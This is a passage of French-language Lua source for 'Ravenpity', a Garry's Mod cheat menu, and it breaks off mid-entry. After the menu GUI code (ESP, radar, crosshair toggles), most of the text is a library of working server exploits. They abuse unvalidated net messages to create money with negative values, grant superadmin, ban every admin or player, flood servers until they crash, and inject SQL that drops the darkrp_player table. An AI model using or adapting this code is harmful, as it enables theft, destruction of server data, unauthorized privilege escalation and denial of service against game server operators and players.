LocalPlayer():ConCommand( "lix_lesp_radar 1" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Radar activé" )
end
end
local   radaroff = vgui.Create( "DButton", HomeBackgroundSupportPanel)
radaroff:SetPos( 365, 5)
radaroff:SetSize( 20, 20  )
radaroff:SetText( "X" )
radaroff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if radaroff:IsHovered() then
radaroff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
radaroff:SetTextColor( Color( 255, 255, 255 ) )       
end
radaroff.DoClick = function()
LocalPlayer():ConCommand( "lix_lesp_radar 0" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Radar désactivé" )
end
end

-------------------------------------------------------------------------------------|

local   mirroron = vgui.Create( "DButton", HomeBackgroundSupportPanel)
mirroron:SetPos( 0, 30)
mirroron:SetSize( 400, 30  )
mirroron:SetText( "Mirroir" )
mirroron.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if mirroron:IsHovered() then
mirroron:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
mirroron:SetTextColor( Color(  255, 255, 255 ) )        
end
mirroron.DoClick = function()
LocalPlayer():ConCommand( "lix_lesp_mirror 1" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Mirroir activé" )
end
end
local   mirroroff = vgui.Create( "DButton", HomeBackgroundSupportPanel)
mirroroff:SetPos( 365, 35)
mirroroff:SetSize( 20, 20  )
mirroroff:SetText( "X" )
mirroroff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if mirroroff:IsHovered() then
mirroroff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
mirroroff:SetTextColor( Color( 255, 255, 255 ) )        
end
mirroroff.DoClick = function()
LocalPlayer():ConCommand( "lix_lesp_mirror 0" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Mirroir désactivé" )
end
end

-------------------------------------------------------------------------------------|

local   crosshairon = vgui.Create( "DButton", HomeBackgroundSupportPanel)
crosshairon:SetPos( 0, 60)
crosshairon:SetSize( 400, 30  )
crosshairon:SetText( "Crosshair" )
crosshairon.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if crosshairon:IsHovered() then
crosshairon:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150)) 
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
crosshairon:SetTextColor( Color(  255, 255, 255 ) )       
end
crosshairon.DoClick = function()
LocalPlayer():ConCommand( "crosshair 0" )
LocalPlayer():ConCommand( "ravenpity_chair 1" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Crosshair activé" )
end
end
local   crosshairoff = vgui.Create( "DButton", HomeBackgroundSupportPanel)
crosshairoff:SetPos( 365, 65)
crosshairoff:SetSize( 20, 20  )
crosshairoff:SetText( "X" )
crosshairoff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if crosshairoff:IsHovered() then
crosshairoff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
crosshairoff:SetTextColor( Color( 255, 255, 255 ) )       
end
crosshairoff.DoClick = function()
LocalPlayer():ConCommand( "crosshair 1" )
LocalPlayer():ConCommand( "ravenpity_chair 0" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Crosshair désactivé" )
end
end


-------------------------------------------------------------------------------------|  

local   espon = vgui.Create( "DButton", HomeBackgroundSupportPanel)
espon:SetPos( 0, 90)
espon:SetSize( 400, 30  )
espon:SetText( "ESP" )
espon.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if espon:IsHovered() then
espon:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150)) 
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
espon:SetTextColor( Color(  255, 255, 255 ) )       
end
espon.DoClick = function()
LocalPlayer():ConCommand( "ravenpity_esp 1" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "ESP activé" )
end
end
local   espoff = vgui.Create( "DButton", HomeBackgroundSupportPanel)
espoff:SetPos( 365, 95)
espoff:SetSize( 20, 20  )
espoff:SetText( "X" )
espoff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if espoff:IsHovered() then
espoff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
espoff:SetTextColor( Color( 255, 255, 255 ) )       
end
espoff.DoClick = function()
LocalPlayer():ConCommand( "ravenpity_esp 0" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "ESP désactivé" )
end
end
end

/*======================================================================================================================================================================================
Informations
========================================================================================================================================================================================*/
function RAVEN.Informations()
if RAVEN.InformationsListe and RAVEN.InformationsListe:IsVisible() then RAVEN.InformationsListe:Remove() end
RAVEN.InformationsListe = vgui.Create("DFrame")
RAVEN.InformationsListe:SetSize(682,350)
RAVEN.InformationsListe:SetTitle("")
RAVEN.InformationsListe:SetPos( 342, 250 )
RAVEN.InformationsListe:MakePopup()
RAVEN.InformationsListe:ShowCloseButton( false ) 
RAVEN.InformationsListe.Paint = function( s, w, h )
if !Ravenmenu or !Ravenmenu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local   CloseButtonInformations = vgui.Create( "DButton", HomeBackgroundSupportPanel)
CloseButtonInformations:SetPos( 0, 370)
CloseButtonInformations:SetSize( 400, 30  )
CloseButtonInformations:SetText( "X" )
CloseButtonInformations.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if CloseButtonInformations:IsHovered() then
CloseButtonInformations:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
CloseButtonInformations:SetTextColor( Color( 255, 255, 255 ) )        
end
CloseButtonInformations.DoClick = function()
surface.PlaySound( "buttons/combine_button1.wav" )
HomeBaseHeader:Remove()
end
end
local   ReturnButtonInformations = vgui.Create( "DButton", HomeBackgroundSupportPanel)
ReturnButtonInformations:SetPos( 0, 340)
ReturnButtonInformations:SetSize( 400, 30  )
ReturnButtonInformations:SetText( "<--" )
ReturnButtonInformations.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ReturnButtonInformations:IsHovered() then
ReturnButtonInformations:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ReturnButtonInformations:SetTextColor( Color( 255, 255, 255 ) )       
end
ReturnButtonInformations.DoClick = function()
HomeBaseHeader:Remove()
LocalPlayer():ConCommand("ravenpity_start")
end
end

-------------------------------------------------------------------------------------|

local   updates1_0 = vgui.Create( "DButton", HomeBackgroundSupportPanel)
updates1_0:SetPos( 0, 0)
updates1_0:SetSize( 400, 30  )
updates1_0:SetText( "V1.0 - Menu de Base" )
updates1_0:SetTextColor( Color( 255, 255, 255, 50 ) )
updates1_0.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
end
local   updates1_1 = vgui.Create( "DButton", HomeBackgroundSupportPanel)
updates1_1:SetPos( 0, 30)
updates1_1:SetSize( 400, 30  )
updates1_1:SetText( "Ajout ESP/Mirroir/Radar" )
updates1_1:SetTextColor( Color( 255, 255, 255, 50 ) )
updates1_1.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
end
local   updates1_2 = vgui.Create( "DButton", HomeBackgroundSupportPanel)
updates1_2:SetPos( 0, 60)
updates1_2:SetSize( 400, 30  )
updates1_2:SetText( "Set Superadmin fonctionnel + Correction bug Derma" )  
updates1_2:SetTextColor( Color( 255, 255, 255, 50 ) )
updates1_2.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
end
local   updates2 = vgui.Create( "DButton", HomeBackgroundSupportPanel)
updates2:SetPos( 0, 90)
updates2:SetSize( 400, 30  )
updates2:SetText( "V2 - New Derma +20 nouveautées" )
updates2:SetTextColor( Color( 255, 255, 255, 200 ) )
updates2.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
end
local   discord = vgui.Create( "HTML", HomeBackgroundSupportPanel)
discord:SetPos( 0, 150)
discord:SetSize( 400, 200  )
discord:SetHTML( "<img src='https://discordapp.com/api/guilds/423078980967596032/widget.png?style=banner2' style='max-width: 100%; margin: 0 auto; display: block;'>" )
discord.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
discord.DoClick = function()
gui.OpenURL( "http://hoperdev.fr" )
end
end
local   discordclick = vgui.Create( "DButton", HomeBackgroundSupportPanel)
discordclick:SetPos( 0, 140)
discordclick:SetSize( 400, 100  )
discordclick:SetText( "" )
discordclick:SetTextColor( Color( 255, 255, 255, 200 ) )
discordclick.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
discordclick.DoClick = function()
gui.OpenURL( "https://discord.gg/8ZPA7tn" )
end
end
end

end)
/*======================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
EXPLOITS
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================*/local ravenhacknet = nil 
RAVEN.AddExploit( "Vole Argent Printers", {
desc = "Money Exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "SyncPrinterButtons76561198056171650" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
if !timer.Exists( "ravenhacknetnet_exploit_shekels" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Tentative de vole lançé" )
timer.Create( "ravenhacknetnet_exploit_shekels", 0.1, 0, function()
for k, v in pairs(ents.GetAll()) do
if( v:GetClass():find("print") ) then
RAVEN.NetStart( "SyncPrinterButtons76561198056171650" )
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
else
timer.Remove( "ravenhacknetnet_exploit_shekels" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Tentative de vole stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Message Spam", {
desc = "Spam everyone with ULX Friends Spam request.",
severity = 1,
scan = function() return (RAVEN.ValidNetString( "sendtable" ) and ulx and ulx.friends ) end,
functions = {
{ typ = "string", name = "Texte", default = "coucou <3", addr = "fr_spamstring" },
{ typ = "players", addr = "fr_players" },
{ typ = "func", name = "Start", func = function()
if !timer.Exists( "bigspams" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Message Spam lançé" )
timer.Create( "bigspams", 0.5, 0, function()
local t = RAVEN.GetStored( "fr_players", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local buyit = {}
for i = 1, 15 do
table.insert( buyit, RAVEN.GetStored( "fr_spamstring", "coucou <3" ) )
end
RAVEN.NetStart( "sendtable" )
net.WriteEntity( v )
net.WriteTable( buyit )
net.SendToServer()
end
end)
else
timer.Remove( "bigspams" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Message Spam stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Erreur RCON Spam", {
desc = "Spam the RCON server with massive Error.",
severity = 1,
scan = function() return RAVEN.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
if !timer.Exists( "ravenhacknetnet_exploit_errorz" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Erreur RCON Spam lançé" )
timer.Create( "ravenhacknetnet_exploit_errorz", 0.1, 0, function()
RAVEN.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end)
else
timer.Remove( "ravenhacknetnet_exploit_errorz" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Erreur RCON Spam stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Erreur Turbo Spam", {
desc = "Spam the Console with massive Error.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
if !timer.Exists( "ravenhacknetnet_exploit_errorzt" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Erreur Spam lançé" )
timer.Create( "ravenhacknetnet_exploit_errorzt", 0, 0, function()
for i = 1, 100 do
RAVEN.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end
end)
else
timer.Remove( "ravenhacknetnet_exploit_errorzt" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Erreur Spam stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Kun Drug", {
desc = "Money Exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "Kun_SellDrug" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
if !timer.Exists( "ravenhacknetnet_exploit_selldrugon" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Tentative d'Exploit lançé" )
timer.Create( "ravenhacknetnet_exploit_selldrugon", 0, 0, function()
for i=1,1000 do
RAVEN.NetStart("Kun_SellDrug")
net.WriteString("mushroom")
net.SendToServer()
end 
end)
else
timer.Remove( "ravenhacknetnet_exploit_selldrugon" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Tentative d'Exploit stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Point Shop Unbox", {
desc = "Exploit.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "net_PSUnBoxServer" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
for k,v in pairs(player.GetAll()) do
local i = 0
for k2,v2 in pairs(PS.Items) do 
if !v:PS_HasItem(v2.ID) then  
timer.Simple(k*i*1.7,function() 
RAVEN.NetStart("net_PSUnBoxServer") 
net.WriteEntity(v) 
net.WriteString(v2.ID) 
net.SendToServer() 
end) 
i = i + 1
end 
end
end
end, },
},
} )
RAVEN.AddExploit( "Donner Superadmin", {
desc = "Give the Superadmin to (a) player(s).",
severity = 4,
scan = function() return RAVEN.ValidNetString( "pplay_deleterow" ) end,
functions = {
{ typ = "players", addr = "l_superadmins" },
{ typ = "func", name = "Donner", func = function()
local t = RAVEN.GetStored( "l_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
local tbl = {}
tbl.name = "FAdmin_PlayerGroup"
tbl.where = {
"steamid",
tostring(id)
}
RAVEN.NetStart("pplay_deleterow")
net.WriteTable(tbl)
net.SendToServer()
local tbl = {}
tbl.tblname = "FAdmin_PlayerGroup"
tbl.tblinfo = {
tostring(id),
"superadmin"
}
RAVEN.NetStart("pplay_addrow")
net.WriteTable(tbl)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Superadmin donné" )
end
end, },
},
} )
local thefrenchenculer = ""
if RAVEN.ValidNetString( "Sandbox_ArmDupe" ) then
thefrenchenculer = "Sandbox_ArmDupe"
else
if RAVEN.ValidNetString( "Fix_Keypads" ) then
thefrenchenculer = "Fix_Keypads"
else
if RAVEN.ValidNetString( "Remove_Exploiters" ) then
thefrenchenculer = "Remove_Exploiters"
else
if RAVEN.ValidNetString( "noclipcloakaesp_chat_text" ) then
thefrenchenculer = "noclipcloakaesp_chat_text"
else
if RAVEN.ValidNetString( "_Defqon" ) then
thefrenchenculer = "_Defqon"
else
if RAVEN.ValidNetString( "_CAC_ReadMemory" ) then
thefrenchenculer = "_CAC_ReadMemory"
else
if RAVEN.ValidNetString( "nostrip" ) then
thefrenchenculer = "nostrip"
else
if RAVEN.ValidNetString( "LickMeOut" ) then
thefrenchenculer = "LickMeOut"
else
if RAVEN.ValidNetString( "MoonMan" ) then
thefrenchenculer = "MoonMan"
if RAVEN.ValidNetString( "Im_SOCool" ) then
thefrenchenculer = "Im_SOCool"
end
end
end
end
end
end
end
end
end
end
RAVEN.AddExploit( "Détruire Database SQL", {
desc = "Destruct the SQL Database.",
severity = 4,
scan = function() return RAVEN.ValidNetString( "pplay_sendtable" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
local tbl = {}
tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
tbl.ply = LocalPlayer()
RAVEN.NetStart("pplay_sendtable")
net.WriteTable(tbl)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Database détruite !" )
end, },
},
} )
RAVEN.AddExploit( "Supprimer Database Serveur", {
desc = "Destruct the server FTP Database.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "WriteQuery" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
if !timer.Exists( "ravenhacknetnet_exploit_datatrasher" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Suppression de la Database lançé" )
timer.Create( "ravenhacknetnet_exploit_datatrasher", 0.5, 0, function()
RAVEN.NetStart( "WriteQuery" )
net.WriteString( "BAN MOI -> "..LocalPlayer():SteamID()..string.rep( "!", math.random( 1, 5000 ) ) )
net.SendToServer()
end)
else
timer.Remove( "ravenhacknetnet_exploit_datatrasher" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Suppression de la Database stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Turbo Chat Spam", {
desc = "Spam the chatbox.",
severity = 1,
scan = function() return RAVEN.ValidNetString( "VJSay" ) end,
functions = {
{ typ = "string", name = "<3", default = "ravenhacknetnetMenu", addr = "vj_spamstring" },
{ typ = "string", name = "<3", default = "vo/npc/male01/hacks01.wav", addr = "vj_spamsound" },
{ typ = "func", name = "Start", func = function()
if !timer.Exists( "bigspamsvj" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Spam Chat lançé" )
timer.Create( "bigspamsvj", 0.1, 0, function()
for k, v in pairs( player.GetAll() ) do
RAVEN.NetStart( "VJSay" )
net.WriteEntity( v )
net.WriteString( RAVEN.GetStored( "vj_spamstring", "ACHETER LE MOD MENU RAVENPITY SUR HOPERDEV.FR" ) )
if RAVEN.GetStored( "vj_spamsound", "" ) != "" then
net.WriteString( RAVEN.GetStored( "vj_spamsound", "" ) )
end
net.SendToServer()
end
end)
else
timer.Remove( "bigspamsvj" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Spam Chat stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "Donner une Arme", {
desc = "Exploit to give you weapons",
severity = 3,
scan = function() return RAVEN.ValidNetString( "CraftSomething" ) end,
functions = {
{ typ = "string", name = "Nom", default = "m9k_ak47", addr = "armes_a_prendre" },
{ typ = "func", name = "Prendre", func = function()
RAVEN.NetStart( "CraftSomething" )
net.WriteEntity( LocalPlayer() )
net.WriteString( RAVEN.GetStored( "armes_a_prendre" ) )
net.WriteString( "" )
net.WriteString( "weapon" )
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Faille ULX (old)", {
desc = "Beware this feat is risky if the addon is up to date you're going to be kick.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "banleaver" ) end,
functions = {
{ typ = "func", name = "Ban Admin", func = function()
for k,v in pairs(player.GetAll()) do               
if v:GetUserGroup() != "user" then -- Custom first ranks, youre fucked bro                 
if v != LocalPlayer() then                 
RAVEN.NetStart("banleaver")                 
net.WriteString(v:SteamID().."{sep}".."hop hop hop")                
net.SendToServer()                 
end                
end                
end 
end, },
{ typ = "func", name = "Ban tout le monde", func = function()
for k,v in pairs(player.GetAll()) do               
if v != LocalPlayer() then                 
RAVEN.NetStart("banleaver")                 
net.WriteString(v:SteamID().."{sep}".."hop hop hop")                
net.SendToServer()                 
end                
end  
end, },
},
} )
RAVEN.AddExploit( "Casino NPC", {
desc = "Money Exploit.",
severity = 4,
scan = function() return RAVEN.ValidNetString( "75_plus_win" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent" },
{ typ = "players", addr = "l_players_listing" },
{ typ = "func", name = "Donner", func = function()
local t = RAVEN.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
RAVEN.NetStart( "75_plus_win" )
net.WriteString( RAVEN.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
{ typ = "func", name = "To take off", func = function()
local t = RAVEN.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
RAVEN.NetStart( "75_plus_win" )
net.WriteString( -RAVEN.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
RAVEN.AddExploit( "ATM Exploit", {
desc = "Money Exploit.",
severity = 4,
scan = function() return RAVEN.ValidNetString( "ATMDepositMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent5" },
{ typ = "func", name = "Prendre", func = function()
RAVEN.NetStart( "ATMDepositMoney" )
net.WriteFloat( -RAVEN.GetStored( "montant_argent5" ) )
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "TAXI Spawn Lag", {
desc = "Make the server Crash.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "Taxi_Add" ) end,
functions = {
{ typ = "func", name = "Spawn", func = function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
RAVEN.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("Les addons leaks c'est plein d'exploit :D")
net.SendToServer()
end, },
{ typ = "func", name = "Super Spam", func = function()
if !timer.Exists( "taxispam" ) then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Taxi Lag lançé" )
timer.Create( "taxispam", 0.05, 0, function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
RAVEN.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("Les addons leaks c'est plein d'exploit :D")
net.SendToServer()
end)
else
timer.Remove( "taxispam" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Taxi Lag stoppé" )
end
end, },
},
} )
RAVEN.AddExploit( "eMining", {
desc = "Money Exploit.",
severity = 4,
scan = function() return RAVEN.ValidNetString( "SellMinerals" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent6" },
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
RAVEN.NetStart("Upgrade")
net.WriteTable( { LuaName = v.LuaName, Amount = -RAVEN.GetStored( "montant_argent6" ) } )
net.SendToServer()
RAVEN.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
{ typ = "func", name = "Enlever", func = function()
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
RAVEN.NetStart("Upgrade")
net.WriteTable( { LuaName = v.LuaName, Amount = RAVEN.GetStored( "montant_argent6" ) } )
net.SendToServer()
RAVEN.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
},
} )
RAVEN.AddExploit( "Gamble NPC", {
desc = "Money Exploit.",
severity = 4,
scan = function() return RAVEN.ValidNetString( "TakeBetMoney" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
RAVEN.NetStart( "TakeBetMoney" )
net.WriteTable({1e333333 , 1e333333})
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Kun Oil Mod", {
desc = "Money Exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "Kun_SellOil" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(ents.GetAll()) do
RAVEN.NetStart("Kun_SellOil")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
RAVEN.AddExploit( "Devenir Policier", {
desc = "Joined the police without passing the form.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "PoliceJoin" ) end,
functions = {
{ typ = "func", name = "Rejoindre", func = function()
RAVEN.NetStart("PoliceJoin")
net.SendToServer() 
end, },
},
} )
RAVEN.AddExploit( "Devenir Policier #2", {
desc = "Joined the police without passing the form.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "CpForm_Answers" ) end,
functions = {
{ typ = "func", name = "Rejoindre", func = function()
RAVEN.NetStart("CpForm_Answers")
net.WriteEntity(LocalPlayer())
net.WriteTable({})
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "Déposer Money", {
desc = "Money Exploit.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "DepositMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent7" },
{ typ = "func", name = "Start", func = function()
for k,v in pairs(ents.GetAll()) do 
swag = v 
end
for k,v in pairs(player.GetAll()) do
RAVEN.NetStart( "DepositMoney" )
net.WriteEntity(swag)
net.WriteString(-RAVEN.GetStored( "montant_argent7" ))
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
RAVEN.AddExploit( "Supprimer Props", {
desc = "Delete PermaProps Exploit.",
severity = 2,
scan = function() return RAVEN.ValidNetString( "MDE_RemoveStuff_C2S" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
RAVEN.NetStart( "MDE_RemoveStuff_C2S" )
net.WriteTable( {DATA="",TARGET=LocalPlayer():GetEyeTrace().Entity} )
net.SendToServer()
end, },
},
} )
RAVEN.AddExploit( "SS Shelf NET", {
desc = "Money Exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "NET_SS_DoBuyTakeoff" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent9" },
{ typ = "func", name = "Start", func = function()
for k,v in pairs(ents.GetAll()) do 
swag = v 
end
RAVEN.NetStart( 'NET_SS_DoBuyTakeoff' )          
net.WriteEntity(LocalPlayer())          
net.WriteEntity(swag)          
net.WriteTable({'spawned_weapon'})          
net.WriteInt(-RAVEN.GetStored( "montant_argent9" ), 16)       
net.SendToServer()   
end, },
},
} )
RAVEN.AddExploit( "Modifier les Taxes", {
desc = "Money Exploit.",
severity = 3,
scan = function() return RAVEN.ValidNetString( "NET_EcSetTax" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent10" },
{ typ = "func", name = "Start", func = function()
RAVEN.NetStart("NET_EcSetTax")
net.WriteInt(-RAVEN.GetStored( "montant_argent10" ), 16)
net.SendToServer() 
end, },
},
} )
RAVEN.AddExploit( "Amende", {
desc = "Money Exploit.",
severity = 3,
